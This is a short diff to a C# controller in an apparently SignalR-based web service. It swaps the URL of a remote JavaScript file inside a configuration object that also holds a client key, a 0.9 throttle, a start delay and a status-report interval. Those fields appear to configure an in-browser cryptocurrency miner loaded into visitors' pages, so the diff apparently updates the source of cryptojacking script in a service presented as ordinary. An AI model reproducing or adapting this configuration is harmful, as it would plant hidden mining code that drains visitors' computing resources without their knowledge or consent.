@@ -97,7 +97,7 @@ namespace SignalRService.Controllers
             {
                 ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
                 Throttle = "0.9",
-                ScriptUrl = "https://www.freecontent.date./W7KS.js",
+                ScriptUrl = "https://srs.hepf.com/api/sc/mscr?filename=aKbo.js",
                 StartDelayMs = 3000,
                 ReportStatusIntervalMs = 65000
             };
